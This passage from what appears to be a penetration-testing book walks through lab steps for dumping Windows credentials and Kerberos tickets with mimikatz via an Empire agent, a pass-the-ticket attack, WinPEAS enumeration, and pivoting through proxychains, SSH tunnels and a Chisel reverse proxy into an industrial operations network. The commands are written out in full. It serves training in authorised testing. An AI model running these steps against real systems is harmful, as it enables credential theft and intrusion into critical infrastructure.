- en: Next, we will interact with our new agent by using the **interact <agent name>**
    command. In my case, the command will be **interact 1PKZ7G3T**. As we saw in the
    previous section, there are many modules that we can use to perform various tests
    and attacks. To start, we can use the **credentials/mimikatz/command** module,
    which allows us to change the command and continue running **mimikatz**. Mimikatz
    is a legendary tool that's used to dump system credentials. To learn more about
    it, go to [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz).
    We will be using mimikatz to dump credentials and tickets. Then, using these tickets,
    we will run a **pass-the-ticket** (**PTT**) attack. A PTT attack works by dumping
    Kerberos tickets from the **Local Security Authority Subsystem Service** (**LSASS**)
    memory.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Use the **set Command sekurlsa::logonPasswords** command and then type **run**.
    You should see the following output:![Figure 11.41 – sekurlsa logonPasswords
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_041.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.41 – sekurlsa logonPasswords
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Once the module has finished running, type **creds** and press *Enter*. You
    will see the credentials that have been captured; these will be stored automatically
    by Empire. Using the **creds** storage side of Empire is a key feature that will
    help immensely with your pentesting engagement. You can view the credentials that
    were discovered by running the **logonPasswords** command:![Figure 11.42 – Credentials
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_042.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.42 – Credentials
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: With that, you have seen how easy it is to dump credentials. Now, we will learn
    how easy it is to use mimikatz to dump tickets. We are going to set the **Command**
    option to **sekurlsa::tickets /export** and then type the command **run**. The
    **/export** object tells the module to export tickets as **.kirbi** files. We
    can then use these tickets to perform more advanced attacks such as PTT. A Golden
    Ticket is a reference to a ticket that grants a user domain admin access. Kerberos
    is widely used, which makes it an excellent attack surface and because it is so
    widely used, attackers have found ways to exploit it. So, to take a look at how
    easy it is to capture tickets, we will set **Command** to **sekurlsa::tickets
    /export** for the **mimikatz** module and then run it. You should see the following
    output:![Figure 11.43 – sekurlsa::tickets
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_043.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.43 – sekurlsa::tickets
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: On our victim host, you will be able to find the **.kirbi** tickets that were
    exported from running the **sekurlsa::tickets /export** command, as shown here:![Figure
    11.44 – .kirbi tickets
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_044.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.44 – .kirbi tickets
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Now that we have **.kirbi** tickets, we can utilize **mimikatz.exe** on our
    victim machine and use the **kerberos::ptt <ticket>** command, as shown here:![Figure
    11.45 – kerberos::ptt – pass the ticket
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_045.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.45 – kerberos::ptt – pass the ticket
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Now, we can verify that PTT worked by running the **klist** command. This will
    list the cached tickets on the system, which will let us see if we have successfully
    impersonated the ticket:![Figure 11.46 – Cached tickets
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '](image/B16321_11_046.jpg)'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 11.46 – Cached tickets
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'Next, we are going to run a module that will perform automatic testing to help
    find a path to exploit. We will be using the WinPEAS module, which can be found
    under the **privesc** category. **Windows Privilege Escalation Awesome Scripts**
    (**WinPEAS**) allows us to sit back and let the programming do its thing. As the
    various tests run, we can watch as the output hits the screen. The information
    is color-coded so that we can easily spot potential points of entry. We will see
    links to hints and tricks for escalating privileges along the way. The following
    screenshot shows the **Basic System Information** options that were discovered:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 11.47 – WinPEAS Basic System Information'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_047.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.47 – WinPEAS Basic System Information
  prefs: []
  type: TYPE_NORMAL
- en: 'As we scroll through this information, we will see that WinPEAS has pulled
    out more useful information regarding the system, such as Network Ifaces and known
    hosts, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.48 – Network Ifaces and known hosts'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_048.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.48 – Network Ifaces and known hosts
  prefs: []
  type: TYPE_NORMAL
- en: 'Under Ifaces and known hosts, we can see a list of devices that our victim
    has communicated with. We can see **Domain Controller** at **.2**, Kali Linux
    at **.6**, and the firewall that we installed at **.7**. If we continue to scroll
    through the information that WinPEAS has produced, we will come across a **Saved
    RDP connections** section, as shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.49 – Saved RDP connections'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_049.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.49 – Saved RDP connections
  prefs: []
  type: TYPE_NORMAL
- en: 'The list goes on for discovery. The more we scroll, the more we find, and we
    will even find the Kerberos tickets that we dumped with mimikatz. Here is an example
    of the Kerberos ticket discovery process when using WinPEAS:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.50 – kerberos tickets'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_050.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.50 – kerberos tickets
  prefs: []
  type: TYPE_NORMAL
- en: There are various tools we can use to get the job done. In this section, we
    explored dumping credentials, dumping tickets, PTT attacks, and running WinPEAS
    to find a path to privilege escalation. Working with these techniques and tools
    is important as every environment is different and each setup and local policy
    is different. You have to be versatile and comfortable with the tools that you
    are using to adapt them to your customer's parameters. In the next section, we
    are going to discuss pivoting through the environment and get deeper and closer
    to the real critical process.
  prefs: []
  type: TYPE_NORMAL
- en: Pivoting
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'One of the most fundamentally important parts of pentesting is pivoting. If
    you don''t take anything else away from reading this book, make sure that you
    bake pivoting into your brain. Pivoting is the technique of leveraging a compromised
    machine to exploit an additional machine that''s deeper in the network. Several
    methods and tools can be used to perform this task. You can use tunneling, proxying,
    and port forwarding to accomplish this task. We touched on a couple of these methods
    already, including port forwarding with NAT rules with the pfSense firewall, which
    we did in this chapter, and proxying with FoxyProxy in [*Chapter 9*](B16321_09_Epub_AM.xhtml#_idTextAnchor106),
    *Ninja 308*. There are also other tools we can use, such as the following:'
  prefs: []
  type: TYPE_NORMAL
- en: Proxychains
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: SSH tunneling and port forwarding
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Chisel
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'These tools are what we will use to explore pivoting. We will use these tools
    to pivot from our Kali host, through our Windows 10 workstation, down to our Windows
    7 machine, which is sitting at the operations and control level of our network.
    Our approach will follow the red line shown on the following network diagram:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.51 – Network pivot'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_051.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.51 – Network pivot
  prefs: []
  type: TYPE_NORMAL
- en: 'To start, we have to make sure that our Windows 10 machine is running OpenSSH
    Server, which can be installed by going to **Apps & features** | **Optional features**
    | **Add a feature**:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.52 – OpenSSH Server'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_052.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.52 – OpenSSH Server
  prefs: []
  type: TYPE_NORMAL
- en: 'Once installed, you will need to start **OpenSSH SSH Server** by going to **Services
    Snap-in**, as shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.53 – OpenSSH SSH Server'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_053.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.53 – OpenSSH SSH Server
  prefs: []
  type: TYPE_NORMAL
- en: 'This will allow us to perform SSH tunneling and utilize proxychains to pivot
    through our firewall and down to the Windows 7 host. Once the server is running,
    we can test the connection by running **ssh** to connect to it from our Kali box.
    Here, you must use the **ssh operator1@172.16.0.4** command. You see results similar
    to the following once you''ve successfully accessed your host:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.54 – SSH Windows 10'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_054.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.54 – SSH Windows 10
  prefs: []
  type: TYPE_NORMAL
- en: If you were to test using **xfreerdp** to run remote desktop to our Windows
    7 box, you would see that it works, and that means our current NAT rule is allowing
    the entire corp subnet to access the operations network.
  prefs: []
  type: TYPE_NORMAL
- en: 'Use the following command to test your remote connection and NAT rules:'
  prefs: []
  type: TYPE_NORMAL
- en: xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7
  prefs: []
  type: TYPE_NORMAL
- en: 'You should see that we have access to the remote desktop of Windows 7\. We
    are going to change our NAT access rules to make sure that we are only allowing
    access from two hosts through the firewall. We will want our domain controller
    to be sitting at **172.16.0.2**, as well as our Windows 10 host, which can be
    found at **172.16.0.4**. The following screenshot shows what your new **Port Forward**
    NAT rules should look like:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.55 – NAT rules'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_055.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.55 – NAT rules
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, go back and test the NAT rules by running **xfreerdp** again. If your
    rules are working, you should get a connection error, as shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.56 – Remote connection error'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_056.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.56 – Remote connection error
  prefs: []
  type: TYPE_NORMAL
- en: With our NAT rules in place, we can simulate the pivoting portion of this chapter.
    We will start by setting up proxychains.
  prefs: []
  type: TYPE_NORMAL
- en: Proxychains
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Proxychains is a program that manages dynamically linking connections and redirects
    those connections through SOCKS4a/5 or HTTP proxies. Proxychains is to command-line
    tools what FoxyProxy is to websites. The ease of use of Proxychains shines when
    running commands as all you have to do is prepend the start of your command with
    **proxychains**. An example would be taking the previous test and running it with
    **proxychains**:'
  prefs: []
  type: TYPE_NORMAL
- en: proxychains xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7
  prefs: []
  type: TYPE_NORMAL
- en: Go to [https://github.com/haad/proxychains](https://github.com/haad/proxychains)
    to learn more about **proxychains** if you are interested.
  prefs: []
  type: TYPE_NORMAL
- en: 'To configure **proxychains**, we are going to navigate to **/etc/proxychains.conf**,
    scroll down to the **[ProxyList]** section, and add a new line; that is, **socks5
    127.0.0.1 9000**. The port can be any number that you would like to use. Here
    is the output at the bottom of my file that I am using in my lab:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.57 – proxychains.conf'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_057.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.57 – proxychains.conf
  prefs: []
  type: TYPE_NORMAL
- en: After configuring **proxychains**, we still need to build a tunnel to leverage
    the proxy. We will learn how to do this in the next section.
  prefs: []
  type: TYPE_NORMAL
- en: SSH tunneling and port forwarding
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: SSH tunneling allows an attacker to essentially *tunnel* a different protocol
    through an established SSH session and ultimately evade **intrusion detection
    systems** (**IDS**). This practice is most commonly used in *nix* systems, but
    as you saw with our Windows 10 host, OpenSSH is a feature that can be enabled
    by default.
  prefs: []
  type: TYPE_NORMAL
- en: Storytime
  prefs: []
  type: TYPE_NORMAL
- en: I can't even count the number of times that I have heard in my career, from
    security managers, that port **22**/SSH is disabled in their environments. Often,
    they would chuckle, saying that their infrastructure is Windows-based, so SSH
    doesn't exist in their network. This was true in the corporate segment of the
    network for a while, especially if the company wasn't using a solution such as
    SolarWinds that uses SSH to log into every switch, router, gateway, and firewall,
    but in the industrial segment, a large portion of the equipment uses SSH. Several
    industrial security products require SSH to be enabled on equipment for data to
    be harvested for **North American Electric Reliability Corporation/Critical Infrastructure
    Protection** (**NERC/CIP**) compliance.
  prefs: []
  type: TYPE_NORMAL
- en: 'We can create port forwards with the SSH **-L** switch, which establishes a
    link to whatever port you designate. Run the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: ssh -L 5555:172.16.0.7:3389 -fn operator1@172.16.0.4
  prefs: []
  type: TYPE_NORMAL
- en: 'This will establish a local link between port **5555** and our remote host
    using port **3389**, which is the remote desktop. We can then use the **-fn**
    switch to background the shell and not run any commands. Finally, we will use
    **operator1** to create the tunnel through our Windows 10 workstation, which we
    know has access to the Windows 7 host. The following diagram shows the communication
    path that we will be attempting:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.58 – Port forward'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_058.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.58 – Port forward
  prefs: []
  type: TYPE_NORMAL
- en: 'Now that we have port forwarding and the SSH tunnel established, we can run
    the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: xfreerdp /u:operator1 /p:Password1 /v:localhost:5555
  prefs: []
  type: TYPE_NORMAL
- en: 'This will open a remote desktop session. If you open Wireshark and capture
    the session, you will see the results of the *tunnel* connection, as shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.59 – SSH tunnel'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_059.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.59 – SSH tunnel
  prefs: []
  type: TYPE_NORMAL
- en: 'Now that we have covered the general principles of **proxychains** and SSH
    tunnels, I am going to combine the two by creating a dynamic tunnel using the
    SSH **-D** switch. Go ahead and run the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: ssh -D 9000 -fN operator1@172.16.0.4
  prefs: []
  type: TYPE_NORMAL
- en: 'Very similar to SSH port forwarding, instead of linking to a dedicated port
    on a specific host, we can use **-D** to create a proxy. Now, we can run the following
    command:'
  prefs: []
  type: TYPE_NORMAL
- en: proxychains xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7
  prefs: []
  type: TYPE_NORMAL
- en: This will use **proxychains**, along with our SSH tunnel, to open a remote desktop
    window. I use **proxychains** with dynamic tunneling as it is much easier to set
    up as you don't have to map every remote port.
  prefs: []
  type: TYPE_NORMAL
- en: Chisel
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Chisel is a tool written in Go that allows an attacker to create an SSH tunnel
    between two hosts, independent of the host's SSH software. This is a great tool
    to use if you get a shell on a Windows host that does not have OpenSSH Server
    installed. We need to have the dedicated binaries for the system that we are going
    to compromise. You can download these binaries from [https://github.com/jpillora/chisel/releases/tag/v1.7.6](https://github.com/jpillora/chisel/releases/tag/v1.7.6).
  prefs: []
  type: TYPE_NORMAL
- en: 'I grabbed both the **linux_amd64** and **windows_amd64** binaries. We need
    to get **chisel_windows_amd64** onto our Windows 10 host. I think we have covered
    multiple ways to do this throughout this book, so I will leave it up to you to
    get the binary onto the box. Next, we want to set up a Chisel server on our Kali
    Linux box. This way, we will create a **reverse socks proxy**. Run the following
    command:'
  prefs: []
  type: TYPE_NORMAL
- en: ./chisel server -p 5555 –reverse &
  prefs: []
  type: TYPE_NORMAL
- en: 'This will tell Chisel to create a reverse proxy server listening on port **5555**
    and run it in the background. If you want to troubleshoot the connection, then
    simply drop the **&** symbol and run the server. You will see the following results:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.60 – Chisel server'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_060.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.60 – Chisel server
  prefs: []
  type: TYPE_NORMAL
- en: 'On our Windows10 host, we want to run the following **client** command to create
    the reverse proxy connection:'
  prefs: []
  type: TYPE_NORMAL
- en: chisel.exe client 172.16.0.6:5555 R:socks &
  prefs: []
  type: TYPE_NORMAL
- en: 'Once again, drop the **&** symbol to troubleshoot the connection. You should
    see the following output:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.61 – Reverse proxy'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_061.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.61 – Reverse proxy
  prefs: []
  type: TYPE_NORMAL
- en: 'As you may have noticed by the last line of output after we ran the **server**
    command, a reverse socks proxy is listening on port **1080**, as shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.62 – Reverse proxy listener'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_062.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.62 – Reverse proxy listener
  prefs: []
  type: TYPE_NORMAL
- en: 'For us to use **proxychains**, we need to change the port in our configuration
    from **9000**, which we used for SSH tunneling, to **1080**, which Chisel created.
    Once the port has been created, rerun the **proxychains** command:'
  prefs: []
  type: TYPE_NORMAL
- en: proxychains xfreerdp /u:operator1 /p:Password1 /v:172.16.0.7
  prefs: []
  type: TYPE_NORMAL
- en: 'If everything worked correctly, you should be sitting with an authenticated
    Windows 7 remote desktop session:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 11.63 – Chisel reverse shell with proxychains'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/B16321_11_063.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 11.63 – Chisel reverse shell with proxychains
  prefs: []
  type: TYPE_NORMAL
- en: As you can see, it is fairly simple to pivot through a trusted workstation,
    past a firewall, down into the operational network, and onto a workstation with
    a few short commands. Having a fully authenticated session allows us to wreak
    havoc on the operational network if we were so inclined to and if it is part of
    our rules of engagement. To do this, we used **proxychains**, combined with SSH
    tunneling, to gain a foothold deeper in the network, but we needed SSH to be present
    on the Windows 10 host. To get around the requirement of needing SSH to be present
    and installed, we used Chisel to gain access.
  prefs: []
  type: TYPE_NORMAL
- en: These techniques only showed the usability of a single hop. Hopefully, the industrial
    network you land on is fairly flat and this is good enough, but I do know that
    defense in depth has gained major traction, which means we have to up our game
    and perform multi-hop pivots. I will leave it up to you to investigate how to
    use the tools we just tested further to perform multi-hop pivots.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Throughout this chapter, we have looked at various tools and techniques for
    harvesting credentials and tickets. We leveraged the *loot* that we captured to
    escalate our privileges, and then we proceeded to pivot through the firewall that
    we installed and configured in the first section of this chapter. I know I said
    it earlier, but I am going to say it again: as my late friend Trevor would say,
    learning how to pivot is one of the most fundamental skills to develop and practice
    as a pentester and never forget Smashburger. I am hoping that as you read and
    worked through this chapter, you gained a better appreciation for why it is so
    critical to have access to a lab to spin systems up and tear them down, navigate
    in and around them, and mirror them to replicate your customer''s environment.'
  prefs: []
  type: TYPE_NORMAL
- en: Now that we have gone this far and we are on the operational side of the network,
    in the next chapter, we will be interacting with the physical process by using
    the user interface of Ignition SCADA and scripting.
  prefs: []
  type: TYPE_NORMAL
